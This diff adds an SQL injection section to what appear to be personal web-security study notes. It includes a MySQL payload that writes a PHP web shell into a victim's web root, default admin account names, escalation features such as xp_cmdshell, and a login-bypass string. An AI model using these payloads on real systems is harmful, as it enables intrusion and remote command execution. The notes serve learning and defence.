@@ -16,3 +16,28 @@ HTTP 특징
 - Client의 요청으로 시작
 - Stateless Protocol -> (cookie, session 등을 사용)
 
+## SQL Injection
+
+### Procedure
+- Time delay check where input is run
+- Try `'` for input and see the result.
+    - Does error occur?
+    - Where does error occur? (DB or )
+
+### WebShell (MYSQL)
+- With root auth : `UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/victim.com/cmd.php" --` 
+
+### Basic Config
+- Microsoft SQL Server : `sa`
+- MySQL : `root` && `anonymous`
+- Oracle : `SYS, SYSTEM, DBSNMP, OUTLN`
+
+### Authority Empowerment
+- `xp_cmdshell, OPENROWSET, LOAD_FILE, ActiveX, Java support`
+
+### Inline Injection
+- use ` 1' OR 1=1 OR 1=1` to by pass `id = input1 AND password = input2`;
+ 
+
+#### Referenced
+- `SQL injection` by `Justin Clarke`
